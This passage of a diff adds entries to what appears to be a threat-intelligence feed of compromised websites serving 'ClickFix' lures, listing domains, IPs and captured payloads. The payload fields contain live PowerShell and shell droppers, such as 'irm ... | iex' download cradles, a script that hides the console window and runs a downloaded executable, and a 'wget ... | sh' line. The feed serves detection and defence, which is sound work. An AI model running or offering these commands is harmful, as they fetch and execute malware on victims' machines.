+    "Payload": "irm 'browse-nnccodes.beer/c6275247a1e042eb'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/c6275247a1e042eb"
+    ],
+    "ReportId": "cmwb7l41601w90nml2u1gu0ov"
+  },
+  {
+    "UrlDomain": "abracitos.com.pe",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "201.148.104.161"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "ClickFix Win+R instruction: ...43a4-B972-7b11871881A1 | IEX IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1 | IEX Press Windows Key + X Ctrl + V...",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1"
+    ],
+    "ReportId": "cmwb7kahw01v40nmlsgwwe4r9"
+  },
+  {
+    "UrlDomain": "139-144-176-119.ip.linodeusercontent.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "139.144.176.119"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1"
+    ],
+    "ReportId": "cmwb7h6fz01uc0nml1d5lhkyi"
+  },
+  {
+    "UrlDomain": "iq-capital.eu",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/wp/e61272334f7c2507"
+    ],
+    "IP": [
+      "37.9.175.132"
+    ],
+    "Related": [
+      {
+        "Value": "i",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "(irm 'https://t-trustresnew[.]com/wp/e61272334f7c2507')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/wp/e61272334f7c2507"
+    ],
+    "ReportId": "cmwb7gg5t01t90nmlz5690sam"
+  },
+  {
+    "UrlDomain": "hndz.com.br",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/wp/64201dc7a70eedfa"
+    ],
+    "IP": [
+      "108.167.188.132"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/wp/64201dc7a70eedfa')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/wp/64201dc7a70eedfa"
+    ],
+    "ReportId": "cmwb71nav01nq0nmlm04mhxot"
+  },
+  {
+    "UrlDomain": "deborabastosplastica.com.br",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.127"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/08a6dccf8af21787",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905756",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/08a6dccf8af21787'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/08a6dccf8af21787"
+    ],
+    "ReportId": "cmwb6xxtu01kl0nmlqd7co3td"
+  },
+  {
+    "UrlDomain": "chawlacards.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.179"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/e18d1c790f9d8ed3",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=55cf111d272f51001d0c68612e78ea1fd5438401d3267f77&amp;_v=29905755",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=55cf111d272f51001d0c68612e78ea1fd5438401d3267f77&_v=29905755",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/e18d1c790f9d8ed3'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/e18d1c790f9d8ed3"
+    ],
+    "ReportId": "cmwb6wqag01jw0nmlnt7ujaq3"
+  },
+  {
+    "UrlDomain": "esteticapaolapineda.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.202"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/6c23bd6dae0e89ab",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/6c23bd6dae0e89ab'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/6c23bd6dae0e89ab"
+    ],
+    "ReportId": "cmwb6w6cv01io0nmlucn640p1"
+  },
+  {
+    "UrlDomain": "agri-nehrunagar.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.92"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/d230586231576f76",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905754",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/d230586231576f76'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/d230586231576f76"
+    ],
+    "ReportId": "cmwb6vhve01hj0nmlyr0vfnh6"
+  },
+  {
+    "UrlDomain": "www.chioscochiringuito.it",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "62.196.165.206"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=add3164684f61d651fbec01a02f605ce6eb0fcb89f2a5c9a&amp;_v=29905754",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwb6v5e501gk0nmli6gxked5"
+  },
+  {
+    "UrlDomain": "bijs.be",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "46.30.213.45"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmwb6ukb801fz0nmlybxc1x8x"
+  },
+  {
+    "UrlDomain": "staging.dailybuzzupdate.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "91.108.98.109"
+    ],
+    "Related": [
+      {
+        "Value": "https://frclau.com/ca.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwb6smrv01b60nml8jiru7wv"
+  },
+  {
+    "UrlDomain": "361uce.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "93.127.179.85"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/313e1132c1e12019",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905751",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/313e1132c1e12019'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/313e1132c1e12019"
+    ],
+    "ReportId": "cmwb6qu7f01a90nml20iif7nj"
+  },
+  {
+    "UrlDomain": "monadnockdevelopment.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "23.185.0.2"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=8217a4bd-5db0-493f-a59c-d634628d1d28&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmonadnockdevelopment[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A09%3A13.413Z&lastShellAt=2026-11-10T21%3A09%3A13.413Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwb6pfm0018w0nmlotuah88g"
+  },
+  {
+    "UrlDomain": "armazembakery.com.br",
+    "DeliveryUrl": [
+      "waysmakeyourlifebetter.com",
+      "goodpersonofourcentury.com",
+      "besthappyfamily.com",
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.227"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/0e479f5349efdb6d",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/0e479f5349efdb6d'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/0e479f5349efdb6d"
+    ],
+    "ReportId": "cmwb6koh8014q0nmlcxbmrlrk"
+  },
+  {
+    "UrlDomain": "deshbanglabd.tv",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "78.46.96.111"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/bd2c3914f336ea48",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905735",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/bd2c3914f336ea48'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/bd2c3914f336ea48"
+    ],
+    "ReportId": "cmwb66qej00vf0nmlrsaf5rdc"
+  },
+  {
+    "UrlDomain": "8xbetpro.me",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "104.21.50.20"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/fbb6e233d74f5f77",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905735",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/fbb6e233d74f5f77'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/fbb6e233d74f5f77"
+    ],
+    "ReportId": "cmwb665c200ul0nml1tkzl4o2"
+  },
+  {
+    "UrlDomain": "debteksystems.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.232"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/04e36292744fbb51",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/04e36292744fbb51'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/04e36292744fbb51"
+    ],
+    "ReportId": "cmwb5sjj200qe0nml09m7819o"
+  },
+  {
+    "UrlDomain": "service.drivesaferoadside.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "82.29.86.226"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwb5rmen00p50nmllldc3ra7"
+  },
+  {
+    "UrlDomain": "www.avm-automation.fr",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/ba8264558d916670",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/ba8264558d916670'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/ba8264558d916670"
+    ],
+    "ReportId": "cmwb5e5cz00nl0nmldr2wepl7"
+  },
+  {
+    "UrlDomain": "reginarossi.de",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "81.88.34.208"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/19c2acc42ea61be2",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905712",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&amp;_v=29905712",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/19c2acc42ea61be2'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/19c2acc42ea61be2"
+    ],
+    "ReportId": "cmwb5cxvo00mr0nmly0i3xbks"
+  },
+  {
+    "UrlDomain": "www.robertoscalco.it",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.47"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/de245c5f07077b06",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905654",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/de245c5f07077b06'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/de245c5f07077b06"
+    ],
+    "ReportId": "cmwb3aant00gt0nmlmc5pa0pm"
+  },
+  {
+    "UrlDomain": "ralphlauren-polo.com.co",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/20852d0346938afe",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/20852d0346938afe'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/20852d0346938afe"
+    ],
+    "ReportId": "cmwb2fd2s00g10nmllb1yc2q6"
+  },
+  {
+    "UrlDomain": "dgzverandas.nl",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "46.202.158.31"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/fd9aaadbb95356a1",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/fd9aaadbb95356a1'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/fd9aaadbb95356a1"
+    ],
+    "ReportId": "cmwb12w7t00dj0nmlk3hyfwh0"
+  },
+  {
+    "UrlDomain": "aodearborn.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.83"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwaxnd5200310nmlgzpibtwd"
+  },
+  {
+    "UrlDomain": "www.michelecolangelo.it",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.108.41"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwaxm2a9001w0nmlwsx9bvyo"
+  },
+  {
+    "UrlDomain": "corneroffice.it",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "93.186.249.49"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwaxluqw000g0nmllo533tq9"
+  },
+  {
+    "UrlDomain": "www.bagnosabbiadoro.net",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.110.72"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589"
+    ],
+    "ReportId": "cmwaxeq5000v60omlk1tfelit"
+  },
+  {
+    "UrlDomain": "blueangelfarm.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "50.116.92.255"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwaxcnir00u90omlix6kpm6e"
+  },
+  {
+    "UrlDomain": "zyraaminos.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.59"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwax9cpd00oa0omlvvewo7j9"
+  },
+  {
+    "UrlDomain": "rematesjudicialesmim.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.203.106"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwax543400mz0omlhv4opfht"
+  },
+  {
+    "UrlDomain": "mawuto.de",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "base.gateway.tenderly.co"
+    ],
+    "PayloadUrl": [
+      "http://timelevel12.com/big"
+    ],
+    "IP": [
+      "91.204.46.73"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/44735eefdb1d4abd",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://base.gateway.tenderly.co",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/44735eefdb1d4abd'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/44735eefdb1d4abd"
+    ],
+    "ReportId": "cmwax209w00lg0oml25avrawp"
+  },
+  {
+    "UrlDomain": "hotelalritrovo.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "94.130.48.220"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwax1z2k00l70omluwxueoah"
+  },
+  {
+    "UrlDomain": "hammerenter.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.222.226.38"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwax1e7400k10omly5mt7cgu"
+  },
+  {
+    "UrlDomain": "www.carrozzeriatondi.it",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "31.11.36.10"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589"
+    ],
+    "ReportId": "cmwawy94v00gz0omlc6uxuw2c"
+  },
+  {
+    "UrlDomain": "siouxtax.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.218.220"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwawx39b00f90omlhj73t2rd"
+  },
+  {
+    "UrlDomain": "infoeds.com.br",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.211.127"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/4ebcfb3eddea4f02",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=d65376557fc4fca9033110520d4383d8c533c8c37d36a646",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/4ebcfb3eddea4f02'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/4ebcfb3eddea4f02"
+    ],
+    "ReportId": "cmwawrukx00c80omliy9fxkyr"
+  },
+  {
+    "UrlDomain": "www.tenutafabiana.it",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.62"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwawqbdd00aw0oml6ie6cyr9"
+  },
+  {
+    "UrlDomain": "thietbidiennuochalinh.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "194.163.34.243"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwawij39007h0omls43cjle7"
+  },
+  {
+    "UrlDomain": "kmebinternetradio.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.149.58"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/174c5db552b2a148",
+        "Type": "payload download"
+      }
+    ],
